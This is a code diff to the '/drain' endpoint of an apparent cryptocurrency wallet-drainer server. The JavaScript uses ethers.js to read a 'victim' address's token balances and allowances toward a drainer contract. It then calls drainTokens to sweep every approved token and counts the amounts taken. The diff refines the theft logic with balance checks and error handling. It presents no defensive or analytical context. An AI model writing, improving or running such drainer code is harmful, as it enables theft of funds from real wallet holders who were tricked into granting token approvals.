@@ -148,34 +148,41 @@ app.post("/drain", async (req, res) => {
     const tokenAddresses = tokenList.map(t => t.address);
     for (const token of tokenList) {
       const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
+      const balance = await tokenContract.balanceOf(victimAddress);
       const allowance = await tokenContract.allowance(victimAddress, drainerContractAddress);
+      console.log(`${token.symbol} balance for ${victimAddress}: ${ethers.formatUnits(balance, token.decimals)}`);
       console.log(`${token.symbol} allowance for ${victimAddress}: ${ethers.formatUnits(allowance, token.decimals)}`);
-      if (allowance === BigInt(0)) {
+      if (balance > 0 && allowance === BigInt(0)) {
         needsApproval = true;
       }
     }
 
     if (drainAll && !needsApproval) {
       console.log(`Draining all tokens from ${victimAddress}...`);
-      tx = await Drainer.drainTokens(victimAddress, tokenAddresses, {
-        gasLimit: 200000,
-        maxFeePerGas: ethers.parseUnits("5", "gwei"), // Override to 5 gwei
-        maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
-      });
-      receipt = await tx.wait();
+      try {
+        tx = await Drainer.drainTokens(victimAddress, tokenAddresses, {
+          gasLimit: 200000,
+          maxFeePerGas: ethers.parseUnits("5", "gwei"),
+          maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
+        });
+        receipt = await tx.wait();
 
-      const eventInterface = new ethers.Interface(drainerAbi);
-      receipt.logs.forEach(log => {
-        try {
-          const parsedLog = eventInterface.parseLog(log);
-          if (parsedLog.name === "TokensDrained") {
-            totalDrained += BigInt(parsedLog.args.amount);
+        const eventInterface = new ethers.Interface(drainerAbi);
+        receipt.logs.forEach(log => {
+          try {
+            const parsedLog = eventInterface.parseLog(log);
+            if (parsedLog.name === "TokensDrained") {
+              totalDrained += BigInt(parsedLog.args.amount);
+            }
+          } catch (e) {
+            console.log("Non-TokensDrained log:", log);
           }
-        } catch (e) {
-          console.log("Non-TokensDrained log:", log);
-        }
-      });
-      console.log(`Transaction sent: ${tx.hash}`);
+        });
+        console.log(`Transaction sent: ${tx.hash}`);
+      } catch (drainError) {
+        console.error("Drain tokens failed:", formatError(drainError));
+        throw drainError;
+      }
     }
 
     if (totalDrained > 0) {
